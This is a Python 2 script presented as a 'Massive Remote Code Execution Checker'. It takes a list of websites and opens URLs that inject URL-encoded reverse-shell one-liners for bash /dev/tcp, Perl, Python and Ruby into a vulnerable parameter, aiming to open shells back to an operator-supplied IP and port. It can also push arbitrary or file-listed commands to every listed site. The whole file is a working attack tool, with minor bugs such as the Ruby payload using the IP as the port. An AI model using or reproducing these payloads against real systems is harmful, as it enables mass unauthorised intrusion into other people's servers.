import webbrowser
import sys
import os.path
import time
import requests



class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
if not len(sys.argv) > 1:
	print("################################")
	print("# For multiple usage:  "+sys.argv[0]+" 'websites txt file'")
	print("# For all commands on one website:\n# Usage: "+sys.argv[0]+" <Website Name>"+" <Commands File Location>\n# Then: Type --all-commands to " + bcolors.WARNING + "[Command Shell]" + bcolors.ENDC +" (Enjoy it !)\n# For Usage Examples: Type --examples to "+ bcolors.WARNING + "[Command Shell]" + bcolors.ENDC+"\n################################")
    
	sys.exit(1)

print("###########################################################")
print('# Massive Remote Code Execution Checker')
print('# Developed by Emre Selim')
print('# Author Github: https://github.com/THYemre')
print("###########################################################\n")

def bash_Shell_(ip,port):
	website = open(sys.argv[1], 'r')
	for site in website:
		site = site.strip()
		print("[+] Getting Shell !!")
		webbrowser.open_new('http://'+site+'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F'+str(ip)+'%2F'+str(port)+'%200%3E%261')
		print ("Closing...")
		time.sleep(1)
	
def perl_shell_(ip,port):
	website = open(sys.argv[1], 'r')
	for site in website:
		site = site.strip()
	      	new_site = ('http://'+site+'perl%20-e%20use Socket%3B%24i%3D'+str(ip)+'%3B%24p%3D'+str(port)+'%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname("tcp"))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i)))){open(STDIN%2C">%26S")%3Bopen(STDOUT%2C">%26S")%3Bopen(STDERR%2C">%26S")%3Bexec("%2Fbin%2Fsh -i")%3B}%3B')
		webbrowser.open_new_tab(new_site)
	print("[+] Getting Shell !!")
	time.sleep(1)
	print ("closing...")
	
def python_script_(ip,port):
	website = open(sys.argv[1], 'r')
	for site in website:
		site = site.strip()
	      	new_site = ('http://'+site+'python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22'+str(ip)+'%22%2C'+str(port)+'))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27')
		webbrowser.open_new_tab(new_site)
	print("[+] Getting Shell !!")
	time.sleep(1)
	print ("closing...")
	
def ruby_shell_(ip,port):
	website = open(sys.argv[1], 'r')
	for site in website:
		site = site.strip()
	      	new_site = ('http://'+site+'ruby%20-rsocket%20-e%27f%3DTCPSocket.open(%22'+str(ip)+'%22%2C'+str(ip)+').to_i%3Bexec%20sprintf(%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf)%27')
		webbrowser.open_new_tab(new_site)
	print("[+] Getting Shell !!")
	time.sleep(1)
	print ("closing...")

def personal_command():
	website = open(sys.argv[1], 'r')
	for site in website:
		site = site.strip()
	      	new_site = ('http://'+site+commnd)
		webbrowser.open_new_tab(new_site)
		time.sleep(1)

def shell():
	data_shell = raw_input("Which shell do you want? Bash[1],Perl[2],Python[3],Ruby[4]: ")
	if data_shell == "1":
		bash_Shell_(input("Type Ip Address: "),input("Type Listener Port: "))
	if data_shell == "2":		
		perl_shell_(input("Type Ip Address: "),input("Type Listener Port: "))
	if data_shell == "3":
		python_script_(input("Type Ip Address: "),input("Type Listener Port: "))
	if data_shell == "4":
		ruby_shell_(input("Type Ip Address: "),input("Type Listener Port: "))
 	if int(data_shell) > 4:
		print("################################")
		print("\n[-] Exiting, undefined command. Command should be 1 - 4")
		print("\n################################")
		sys.exit(1)

def all_commands_for_a_website(website_name,all_commands):
	all_commands = open(sys.argv[2], 'r')
	for command in all_commands:
		command = command.strip()
		new_site = ('http://'+website_name+command)
		webbrowser.open_new_tab(new_site)
		time.sleep(1)
	

def examples():
	print("\n# For multiple usage example: "+sys.argv[0]+" 'websites.txt'\n# Then type your command to "+bcolors.WARNING + "[Command Shell]" + bcolors.ENDC+"\n# (Enjoy it !)")
	print("################################")
	print("# For try reverse shell usage example: "+sys.argv[0]+ " 'websites.txt'"+"\n# Then type 'shell' to "+bcolors.WARNING + "[Command Shell]" + bcolors.ENDC+"\n# (Enjoy it !)")
	print("################################")
	print("# For check all commands for a website example: "+sys.argv[0]+ " abcdef.vu/jpwhois.php?IP="+" commands.txt"+"\n# Then type '--all-commands' to "+bcolors.WARNING + "[Command Shell]" + bcolors.ENDC+"\n# (Enjoy it !)")

print("################################")
print("# For multiple usage:  "+sys.argv[0]+" 'websites txt file'")
print("# For all commands on one website:\n# Usage: "+sys.argv[0]+" <Website Name>"+" <Commands File Location>\n# Then: Type --all-commands to " + bcolors.WARNING + "[Command Shell]" + bcolors.ENDC +" (Enjoy it !)\n# For Usage Examples: Type --examples to "+ bcolors.WARNING + "[Command Shell]" + bcolors.ENDC+"\n################################")

commnd = raw_input("\n"+bcolors.WARNING + "[Command Shell]"+bcolors.ENDC+ " Please Type your wanted command (For try shell type (shell)): ")
if commnd == "shell":
	shell()
	sys.exit(1)
if commnd == "--all-commands":
	all_commands_for_a_website(sys.argv[1],sys.argv[2])
        sys.exit(1)
if str(commnd) == '':
	print("################################\n")
	print("[-] Exiting, Look to Usages/Examples! --examples")
	print("\n################################")
	sys.exit(1)
if commnd == "--examples":
	examples()
	sys.exit(1)
else:
	print("#################################\n")
	print("Command Executed")
	print("\n#################################\n")
	personal_command()
        sys.exit(1)
